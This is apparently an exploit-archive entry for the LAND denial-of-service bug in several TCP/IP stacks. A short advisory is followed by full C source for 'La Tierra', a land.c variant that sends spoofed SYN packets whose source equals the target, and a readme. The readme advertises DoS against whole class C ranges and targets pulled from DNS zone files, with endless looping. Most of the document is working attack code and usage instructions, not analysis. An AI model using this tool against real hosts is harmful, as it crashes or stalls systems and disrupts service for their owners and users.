source: http://www.securityfocus.com/bid/2666/info
   
A number of TCP/IP stacks are vulnerable to a "loopback" condition initiated by sending a TCP SYN packet with the source address and port spoofed to equal the destination source and port. When a packet of this sort is received, an infinite loop is initiated and the affected system halts. This is known to affect Windows 95, Windows NT 4.0 up to SP3, Windows Server 2003, Windows XP SP2, Cisco IOS devices & Catalyst switches, and HP-UX up to 11.00.
   
It is noted that on Windows Server 2003 and XP SP2, the TCP and IP checksums must be correct to trigger the issue.
   
**Update: It is reported that Microsoft platforms are also prone to this vulnerability. The vendor reports that network routers may not route malformed TCP/IP packets used to exploit this issue. As a result, an attacker may have to discover a suitable route to a target computer, or reside on the target network segment itself before exploitation is possible. 

/**************************************************************/
/*                                                            */
/*  La Tierra v1.0b  - by MondoMan (KeG), elmondo@usa.net     */
/*                                                            */
/*  Modified version of land.c by m3lt, FLC                   */
/*                                                            */
/*  Compiled on RedHat Linux 2.0.27, Intel Pentium 200Mhz     */
/*  gcc version 2.7.2.1       tabs set to 3                   */
/*                                                            */
/*  gcc latierra.c -o latierra                                */
/*                                                            */
/*  Refer to readme.txt for more details and history          */
/*                                                            */
/**************************************************************/                                  
#include <stdio.h>
#include <getopt.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_tcp.h>
#include <netinet/protocols.h> 

#define DEFAULT_FREQUENCY		1 
#define TRUE	 					1
#define FALSE   					0
#define FOR_EVER 					-5
#define LIST_FILE  				1
#define ZONE_FILE  				2
#define MAXLINELENGTH 			512
#define DEFAULT_SEQ				0xF1C
#define DEFAULT_TTL           0xFF
#define DEFAULT_TCPFLAGS      (TH_SYN | TH_PUSH)
#define DEFAULT_WINSIZE       0xFDE8

struct pseudohdr
	{
   struct in_addr saddr;
   struct in_addr daddr;
   u_char zero;
   u_char protocol;
   u_short length;
   struct tcphdr tcpheader;
	};

typedef struct latierra_data
	{
	char dest_ip[256];
	int  tcp_flags;
	int  window_size;
	int  ip_protocol;
	int  sequence_number;
	int  ttl;
	int  supress_output;
        int  message_type;
	} LATIERRA_DATA;

void alternatives(void);
int  get_ip(int use_file, FILE *fp, char *buff);
int  land(LATIERRA_DATA *ld, int port_number);
void nslookup_help(void);
void print_arguments(void);
void protocol_list(void);

/********/
/* main */
/********/
int main(int argc, char **argv)
{
	FILE *fp;
	LATIERRA_DATA ld;
	int frequency = DEFAULT_FREQUENCY, x;
	int beginning_port=1, octet=1, scan_loop=0, loop_val=0, use_file=FALSE;
	int ending_port = 0, loop = TRUE, i = 0, increment_addr = FALSE;
   char got_ip = FALSE, got_beg_port = FALSE;
	char class_c_addr[21], filename[256], buff[512], valid_tcp_flags[16];

	printf("\nlatierra v1.0b by MondoMan (elmondo@usa.net), KeG\n");
   printf("Enhanced version of land.c originally developed by m3lt, FLC\n");

	strcpy(valid_tcp_flags, "fsrpau");
	ld.tcp_flags = 0;
	ld.window_size = DEFAULT_WINSIZE;
	ld.ip_protocol = IP_TCP;
	ld.sequence_number = DEFAULT_SEQ;
	ld.ttl = DEFAULT_TTL;
	ld.message_type = 0;
	
	if(argc > 1 && (!strcmp(argv[1], "-a")))
		alternatives();

	if(argc > 1 && (!strcmp(argv[1], "-n")))
		nslookup_help();

	if(argc > 1 && (!strcmp(argv[1], "-p")))
		protocol_list();

	if(argc == 1 || ( (argc >= 2) && (!strcmp(argv[1], "-h"))))
		print_arguments();

	while((i = getopt(argc, argv, "i:b:e:s:l:o:t:w:p:q:v:m:")) != EOF)
		{
		switch(i)
			{	
			case 't':
				for(x=0;x<strlen(optarg);x++)
					switch(optarg[x])
						{
						case 'f':                        /* fin */
							ld.tcp_flags |= TH_FIN;
							break;
						case 's':                        /* syn */
							ld.tcp_flags |= TH_SYN;
							break;
						case 'r':                        /* reset */
							ld.tcp_flags |= TH_RST;
							break;
						case 'p':                        /* push */
							ld.tcp_flags |= TH_PUSH;			
							break;
						case 'a':                        /* ack */
							ld.tcp_flags |= TH_ACK;
							break;
						case 'u':                        /* urgent */
							ld.tcp_flags |= TH_URG;
							break;
						default:
							printf("\nERROR: Invalid option specified [ %c ] for tcp_flags.\n\n", optarg[x]);
							return(-12);
							break;
						}
				break;
			case 'q':
				ld.sequence_number = atoi(optarg);
				break;
			case 'w':
				ld.window_size = atoi(optarg);
				break;
			case 'm':
				ld.message_type = atoi(optarg);
				break;
			case 'v':
				ld.ttl = atoi(optarg);
				break;
			case 'p':
				ld.ip_protocol = atoi(optarg);
				break;
			case 'o':
				ld.supress_output = TRUE;
				break;
			case 'i':
				if(strlen(optarg) > 1)
					strcpy(ld.dest_ip, optarg);
				else
					{
					printf("ERROR: Must specify valid IP or hostname.\n");
					return(-6);
					}
				got_ip = TRUE;
				break;
			case 's':
				frequency = atoi(optarg);	
				break;
			case 'l':
				loop = atoi(optarg);
				break;
			case 'b':
				beginning_port = atoi(optarg);
				got_beg_port = TRUE;
				break;
			case 'e':
				ending_port = atoi(optarg);
				break;
			}
		}

	if(!ld.tcp_flags)
		ld.tcp_flags = DEFAULT_TCPFLAGS;

	if(!got_beg_port)
		{
		fprintf(stderr, "\nMust specify beginning port number.  Use -h for help with arguments.\n\n");
		return(-7);
		}

	if(ending_port == 0)
		ending_port = beginning_port;

	printf("\nSettings:\n\n");

   printf("  (-i)   Dest. IP Addr   : ");

	if(ld.dest_ip[strlen(ld.dest_ip) -1] == '-')
		{
		ld.dest_ip[strlen(ld.dest_ip)-1] = 0x0;
		strcpy(class_c_addr, ld.dest_ip);
		strcat(ld.dest_ip, "1");
		printf(" %s (Class C range specified).\n", ld.dest_ip);
		increment_addr = TRUE;
		octet = 1;
		}
	else
		if(strlen(ld.dest_ip) > 5)
			{
			if(strncmp(ld.dest_ip, "zone=", 5)==0)
				{
				strcpy(filename, &ld.dest_ip[5]);
				printf("%s (using DNS zone file)\n", filename);
				use_file = ZONE_FILE;
				}	
			else if(strncmp(ld.dest_ip, "list=", 5) == 0)
				{
				strcpy(filename, &ld.dest_ip[5]);
				printf("%s (using ASCII list)\n", filename);
				use_file = LIST_FILE;
				}
			else
				printf("%s\n", ld.dest_ip);
			}
		else 
			{
			printf("Destination specifier (%s) length must be > 7.\n", ld.dest_ip);
			return(-9);
			}

	printf("  (-b)   Beginning Port #: %d\n",     beginning_port );
	printf("  (-e)   Ending Port #   : %d\n",     ending_port );
	printf("  (-s)   Seconds to Pause: %d\n",     frequency );
	printf("  (-l)   Loop            : %d %s\n",  loop, (loop == FOR_EVER) ? "(forever)" : " " );
	printf("  (-w)   Window size     : %d\n",     ld.window_size );
	printf("  (-q)   Sequence Number : %X (%d)\n",ld.sequence_number, ld.sequence_number );
	printf("  (-v)   Time-to-Live    : %d\n",     ld.ttl);
	printf("  (-p)   IP Protocol #   : %d\n",     ld.ip_protocol );
	printf("  (-t)   TCP flags       : "); 

	strcpy(buff, "");

	if( ld.tcp_flags & TH_FIN)
		strcat(buff, "fin ");
	if( ld.tcp_flags & TH_SYN)
		strcat(buff, "syn ");
	if(ld.tcp_flags & TH_RST)
		strcat(buff, "rst ");
	if(ld.tcp_flags & TH_PUSH)
		strcat(buff, "push ");
	if(ld.tcp_flags & TH_ACK)
		strcat(buff, "ack ");
	if(ld.tcp_flags & TH_URG)
		strcat(buff, "urg ");

	printf("%s\n\n", buff);
			
	if(ending_port < beginning_port)
		{
		printf("\nERROR: Ending port # must be greater than beginning port #\n\n");
		return(-8);
		}
	
	scan_loop = loop_val = loop;
	
	if(use_file)
		{
		if(access(filename, 0))
			{
			printf("\nERROR: The file you specified (%s) cannot be found.\n\n", filename);
			return(-9);
			}

		if( (fp = fopen(filename, "rt")) == NULL)
			{
			printf("ERROR: Unable to open %s.\n", filename);
			return(-10);
			}

		if(!get_ip(use_file, fp, buff))
			{
			printf("Unable to get any IP address from file %s.\n");
			return(-11);
			}

		strcpy(ld.dest_ip, buff);
		}
	
	while( (loop == FOR_EVER) ? 1 : loop-- > 0)
		{
		for(i=beginning_port; i <= ending_port; i++)
			{
			if(land(&ld, i))        /* go for it BaBy! */
				break;

   		if(frequency)          /* make sure freq > 0 */
			 	{
				if(!ld.supress_output)
					printf("-> paused %d seconds.\n", frequency);
				sleep(frequency);
				}
			}

		if( (!use_file) && (loop && increment_addr) )
			{
			char temp_addr[21];

			if(++octet > 254)                        /* check for reset */
				{
				if(loop_val != FOR_EVER)              /* make sure not to distrute forever! */
					{
					if(++scan_loop > loop_val)        /* check if scanned x times */
						break;
					else
						loop = loop_val;                /* restore original value */
					}
				octet = 1;	                          /* reset */
				}

			sprintf(temp_addr, "%s%d", class_c_addr, octet);
			strcpy(ld.dest_ip, temp_addr);
		
			if(!ld.supress_output)
				printf("** incrementing to next IP address: %s\n", ld.dest_ip);

			if(scan_loop > loop_val)
				break;	/* break while loop */
			}
		else if(use_file)
			{
			if(!get_ip(use_file, fp, buff))
				break;
		
			loop++;

			strcpy(ld.dest_ip, buff);
			}

		} /* end while */

	printf("\nDone.\n\n");
} /* end main */

int  get_ip(int use_file, FILE *fp, char *buff)
{
	if(use_file == LIST_FILE)
		return(get_ip_from_list(fp, buff));
		
	return(get_ip_from_zone(fp, buff));
}

int get_ip_from_list(FILE *fp, char *buff)
{
	int ret_val;

	while(1)
		{
		ret_val = (int)fgets(buff, MAXLINELENGTH, fp);

		if((ret_val == EOF) || (ret_val == (int)NULL))
			return 0;

		if( strlen(buff) >= 7)
			if((buff[0] != ';') && (buff[0] != '['))
				{
				if( (buff[strlen(buff)-1] == '\r') || (buff[strlen(buff)-1] == '\n') )
					buff[strlen(buff)-1] = 0x0;

				return 1;
				}
		}

	return 0;
}

int get_ip_from_zone(FILE *fp, char *buff)
{
	int ret_val, i;
	char *p, delim[8];

	strcpy(delim, " \t");

	while(1)
		{
		ret_val = (int)fgets(buff, MAXLINELENGTH, fp);

		if((ret_val == EOF) || (ret_val == (int)NULL))
			return 0;

		if( strlen(buff) >= 7)
			if((buff[0] != ';') && (buff[0] != '[') && (strncmp(buff, "ls -d", 5) != 0))
				{
				if( (p = strtok( buff, delim)) == NULL)
					continue;

				if( (p = strtok(NULL, delim)) == NULL)
					continue;

				if(strcmp(p, "A"))   /* be sure second column is an DNS A record */
					continue;
				
				if( (p = strtok(NULL, delim)) == NULL)
					continue;

				strcpy(buff, p);

				/* verify that we have a valid IP address to work with */

				if(inet_addr(p) == -1)
					continue;

				/* strip off training line characters */
				
				if( (buff[strlen(buff)-1] == '\r') || (buff[strlen(buff)-1] == '\n') )
					buff[strlen(buff)-1] = 0x0;

				return 1;
				}
		}

	return 0;
}

/************/
/* checksum */
/************/
u_short checksum(u_short * data,u_short length)
{
	register long value;
	u_short i;

	for(i = 0; i< (length >> 1); i++)
		value += data[i];

	if((length & 1)==1)
		value += (data[i] << 8);

	value = (value & 0xFFFF) + (value >> 16);

	return(~value);
}

/********/
/* land */
/********/
int land(LATIERRA_DATA *ld,  int port_number)
{
	struct sockaddr_in sin;
   int sock;
   char buffer[40];
   struct iphdr * ipheader = (struct iphdr *) buffer;
   struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
   struct pseudohdr pseudoheader;

	bzero(&sin,sizeof(struct sockaddr_in));

   sin.sin_family=AF_INET;

   if((sin.sin_addr.s_addr=inet_addr(ld->dest_ip))==-1)
   	{
      printf("ERROR: unknown host %s\n", ld->dest_ip);
      return(-1);
      }

	if((sin.sin_port=htons(port_number))==0)
  		{
      printf("ERROR: unknown port %s\n",port_number);
      return(-2);
      }

	if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
   	{
      printf("ERROR: couldn't allocate raw socket\n");
      return(-3);
      }

	bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));

   ipheader->version=4;
   ipheader->ihl=sizeof(struct iphdr)/4;
   ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
   ipheader->id=htons(ld->sequence_number);
   ipheader->ttl = ld->ttl;
   ipheader->protocol = ld->ip_protocol;
   ipheader->saddr=sin.sin_addr.s_addr;
   ipheader->daddr=sin.sin_addr.s_addr;

   tcpheader->th_sport = sin.sin_port;
   tcpheader->th_dport = sin.sin_port;
   tcpheader->th_seq = htonl(ld->sequence_number);
   tcpheader->th_flags = ld->tcp_flags;
   tcpheader->th_off = sizeof(struct tcphdr)/4;
   tcpheader->th_win = htons(ld->window_size);

   bzero(&pseudoheader,12+sizeof(struct tcphdr));

   pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
   pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
   pseudoheader.protocol = ld->ip_protocol;
   pseudoheader.length = htons(sizeof(struct tcphdr));
   bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
   tcpheader->th_sum = checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));

   if( sendto(sock, 	buffer, 
							sizeof(struct iphdr)+sizeof(struct tcphdr),
							ld->message_type,
							(struct sockaddr *) &sin,
							sizeof(struct sockaddr_in) )==-1)
   	{
      printf("ERROR: can't send packet. (sendto failed)\n");
      return(-4);
      }

	if(!ld->supress_output)
		printf("-> packet successfully sent to: %s:%d\n", ld->dest_ip, port_number);

   close(sock);

   return(0);
}
/* End of land */

void alternatives()
{
	printf("\nAlternative command line arguments for option -i\n\n");

	printf("    You can create two types of files that latierra can use to get\n");
	printf("    a list of IP addresses, a simple ASCII file with each IP address\n");
	printf("    appearing on each line or better yet, a DNS zone file created by\n");
	printf("    nslookup.  If you are unfamiliar with nslookup, specify a '-n' on the\n");
	printf("    command line of latierra.\n\n");
	printf("    Basically, latierra will walk down the list and send the spoofed packet\n");
	printf("    to each IP address.  Once the list is complete, and loop > 1, the list\n");
 	printf("    is repeated.   To specify that the '-i' option should use a zone file,\n");
	printf("    specify \"zone=filename.txt\" instead of an IP address.  To specify a \n");
	printf("    simple ASCII list of IP addresses, use \"list=filename.txt\".  Lines\n");
	printf("    beginning with ';' or '[' are ignored.  Lines that are not an 'A' \n");
	printf("    record (second column)in a zone file will ignored.\n\n");

	exit(-1);
}

void nslookup_help()
{
	printf("\nNSLOOKUP help\n\n");
	

	printf("To see who is the DNS server for a particular domain, issue the following:\n");
	printf("        > set type=ns\n");
	printf("        > xyz.com\n\n");
	printf("  You will see a list of the name server(s) if completed successfully\n\n");

	printf("To get a list of all the DNS entries for a particular domain, run nslookup\n");
	printf("and issue the following commands:\n");
	printf("         > server 1.1.1.1\n");
	printf("         > ls -d xyz.com > filename.txt\n\n");

	printf("Line 1 sets the server that nslookup will use to resolve a name.\n");
	printf("Line 2 requires all the information about xyz.com be written to filename.txt\n\n"); 

	exit(-1);
}

void protocol_list()
{
	printf("\nProtocol List:\n\n");	
	printf("Verified:\n");
	printf("1-ICMP   2-IGMP   3-GGP  5-ST   6-TCP   7-UCL   8-EGP   9-IGP  10-BBN_RCC_MON\n");
	printf("11-NVP11   13-ARGUS   14-EMCON   15-XNET   16-CHAOS   17-UDP   18-MUX\n");
	printf("19-DCN_MEAS   20-HMP   21-PRM   22-XNS_IDP   23-TRUNK1   24-TRUNK2\n");
	printf("25-LEAF1   26-LEAF2    27-RDP   28-IRTP      29-ISO_TP4  30-NETBLT\n");
	printf("31-MFE_NSP   32-MERIT_INP   33-SEP   34-3PC   62-CFTP    64-SAT_EXPAK\n");
	printf("66-RVD       67-IPPC        69-SAT_MON   70-VISA         71-IPCV\n");
	printf("76-BR_SAT_MON   77-SUN_ND   78-WB_MON   79-WB_EXPAK   80-ISO_IP\n");
	printf("81-VMTP   82-SECURE_VMTP   83-VINES  84-TTP   85-NSFNET_IGP   86-DGP\n");
	printf("87-TCF    88-IGRP          89-OSPFIGP         90-SPRITE_RPG   91-LARP\n\n");
	printf("Supported:\n");
	printf("    6-TCP     17-UDP    (future: PPTP, SKIP) \n\n");

	exit(-1);
}

void print_arguments()
{
	printf("Arguments: \n");
	printf("     *   -i dest_ip = destination ip address such as 1.1.1.1\n");
	printf("                If last octet is '-', then the address will increment\n");
	printf("                from 1 to 254 (Class C) on the next loop\n");
	printf("                and loop must be > 1 or %d (forever).\n", FOR_EVER);
	printf("                Alternatives = zone=filename.txt or list=filename.txt (ASCII)\n");
	printf("                For list of alternative options, use  -a instead of -h.\n");
	printf("     *   -b port# = beginning port number (required).\n");
        printf("         -e port# = ending port number (optional)\n");
	printf("         -t = tcp flag options (f=fin,~s=syn,r=reset,~p=push,a=ack,u=urgent)\n");
	printf("         -v = time_to_live value, default=%d\n", DEFAULT_TTL);
	printf("         -p protocol = ~6=tcp, 17=udp, use -p option for complete list\n");
	printf("         -w window_size = value from 0 to ?, default=%d\n", DEFAULT_WINSIZE);
	printf("         -q tcp_sequence_number, default=%d\n", DEFAULT_SEQ);
	printf("         -m message_type (~0=none,1=Out-Of-Band,4=Msg_DontRoute\n");
	printf("         -s seconds = delay between port numbers, default=%d\n", DEFAULT_FREQUENCY);
	printf("         -o 1 = supress additional output to screen, default=0\n" );
	printf("         -l loop = times to loop through ports/scan, default=%d, %d=forever\n", 1, FOR_EVER);
	printf("     * = required     ~ = default parameter values\n\n");
	exit(-1);
}
/* End of file */


----------------- readme.txt  ------------------------------

La Tierra v1.0b  - by MondoMan (KeG), elmondo@usa.net

       Modified version of land.c by m3lt, FLC

To compile latierra, type:

	gcc latierra.c -o latierra

	To see the help screen, use 'latierra -h'

This program crashes Windows 95, and will cause Windows NT  
4.0, SP3 to utilize a high percentage of CPU.  In some     
instances, CPU usage reaches %100.
                                                         
land.c description:                                        

land.c sends a spoofed packet with the SYN flag from the   
the same IP and port number as the destination.  For       
example, if you want to do a DoS on 1.1.1.1, port 80, it would   
spoof 1.1.1.1 port 80 as the source.  The problem is with  
NT4 SP3, however, is once you issue this packet to a     
port, NT4 SP3 appears to ignore all other attempts -

UNTIL ...
                                                            
                     La Tierra!
                                                            
La Tierra description:                                     
                                                            
La Tierra basically works by sending NT the same packet
used in land.c but to more than one port (if specified).
It doesn't appear to matter if the port is opened or closed!
NT doesn't appear to let this happen again on the same port
successively, but you simply change ports, and you can easily 
go back to the original port and it'll work again. What's even
more interesting is the fact that port 139 works with this.
You would have thought - I'll leave that alone for now!

While testing, I used a Compaq dual Intel Pentium Pro 200, and
was able to take up to %64 CPU.  With one processor disabled, 
CPU usage was %100.  NT4 SP3 doesn't seem to crash, just needs
time to recover, even with one spoofed packet.

Features include:

	- Ability to launch a DoS on an entire class C address
	- Specify the beginning and ending port range
	- Specify the number of loops or make it loop forever!
	- User defined TCP flags: fin, syn, reset, push, ack, 
	  and urgent
	- Other IP options such as window size, time-to-live, 
	  sequence_number, and message_type
	- Ability to read a DNS zone file for IP addresses
	- Ability to read a ASCII file containing IP addresses

Command line options:

     - i ip_address

	DEFAULT: None
	RANGE: Valid IP Address
	OPTIONAL: No

	where ip_address is a valid ip_address, or if you wish to
	cycle through a class C address, the last octet is dropped
        and replaced with a '-'.  This option is required.  The 
	source and destination address are obtained from this value.

	Rather than specifying an IP address, you may wish to create
        an ASCII file, or better yet, use nslookup to obtain all 
        zone information for a particular domain.  The ASCII file
	simply contains a list of IP addresses, one on each line.

	To get a DNS file, simply use nslookup, and the 
	"ls -d somedomain.com > filename.txt" command.  You can use
	'latierra -n' to read more about the command sequence for
	nslookup.

	In both types of files, lines that begin with ';' or '[' are 
	ignored. In DNS files, only 'A' records are processed.

	Examples:

	   Single IP Address:
		-i 10.1.2.1

	   Class C range:
		-i 10.1.2.-

	   ASCII file:
		-i list=filename.txt

	   DNS file:
		-i zone=filename.txt

     -b beginning_port_number

	DEFAULT: None
	RANGE: Positive Integer
	OPTIONAL: No

	where this value is the port_number that latierra will use. If
	no ending_port_number is specified, ending_port_number is then
	equal to this value.  Valid range is 1 to 0xFFFF

     -e ending_port_number

	DEFAULT: If not specified, equal to beginning_port_number
	RANGE: Positive Integer
	OPTIONAL: Yes

	is the highest port number in the range to cycle through. 

	Example:

		-i 10.1.2.1 -b 23 -e 80

	will start at port 23 and increment up to port 80.  You can 
        delay the next increment by using the -s option.  Valid range
	is 1 to 0xFFFF

     -s seconds_between_spoofs

	DEFAULT: 1
	RANGE: Positive Integer
	OPTIONAL: Yes

	You may want to control the seconds between spoofs.  If you
        specify a zero, no delays occur.

	In the below example, the spoof will between ports 23 and 80,
	every 3 seconds.

		-i 10.1.2.1 -b 23 -e 80 -s 3

     -l number_of_loops
	
	DEFAULT: 1
	RANGE: Positive Integer, -5 loops forever
	OPTIONAL: Yes
	
	This option if set greater than 1, will cause a repeat of the
        cycle.  For example:

		-i 10.1.2.1 -b 23 -e 80 -s 0 -l 8

	will cause latierra to go through ports 23 through 80 and
	repeat the process 8 times, with no delay.  Look at the
	following example:

		-i 10.1.2.- -b 23 -e 80 -s 0 -l 8

	latierra will start at 10.1.2.1, port 23 through 80, then
	increment to 10.1.2.2, port 23 through 80, and so on until
	it gets to 10.1.2.254, in which case it will repeat the
	same procedure over again 8 times.

	By specifying a value of -5 for this option, latierra will
	loop forever, until you manually stop the process.  In the
	last example above, the procedure would never end.  When it
	reaches 10.1.2.254, it falls back to 10.1.2.1 and start
	over again from there.

	Other examples:

		-i 10.1.2.1 -b 139 -s 0 -l -5
		-i 10.1.2.- -b 80 -s 5 -l 10
                                                      
     -t tcp_flags

	DEFAULT: sp   (SYN, PUSH)
	RANGE: valid character set (see below)
	OPTIONAL: Yes

	this option sets the various TCP flags, which include:

		f = fin		s = syn		r = reset
		p = push	a = ack		u = urgent

	Example:

		-i 10.1.2.1 -b 139 -t apu -s 0

		To set the ack, push, and urgent flag

     -v time_to_live_value

	DEFAULT: 0xFF (255 decimal)
	RANGE: Positive Integer
	OPTIONAL: Yes

	Sets the time to live value.

     -p protocol_value

	DEFAULT: 6 (tcp)
	RANGE: Positive Integer
	OPTIONAL: Yes

	Sets the protocol value in the IP header.  To see a list of 
 	available protocols, run "latierra -p".

     -w window_size_value

	DEFAULT: 0xFFFF (65000 decimal)
	RANGE: Positive long value
	OPTIONAL: Yes

     -q tcp_sequence_number_value

	DEFAULT: 0xF1C
	RANGE: Positive integer
	OPTIONAL: Yes

     -o 1 supress_additional_output

	DEFAULT: messages are printed for status
	RANGE: None
	OPTIONAL: Yes

	If you don't want to see the messages during the process,
	simply use this "-o 1" to turn them off.

Final Note:

Please use this program for in-house testing purposes only.  

Just because your sending spoofed packets, doesn't mean you 
can't be traced.

Good luck.

- MondoMan
elmondo@usa.net
                                                          
-------------------- end of file -------------------------------
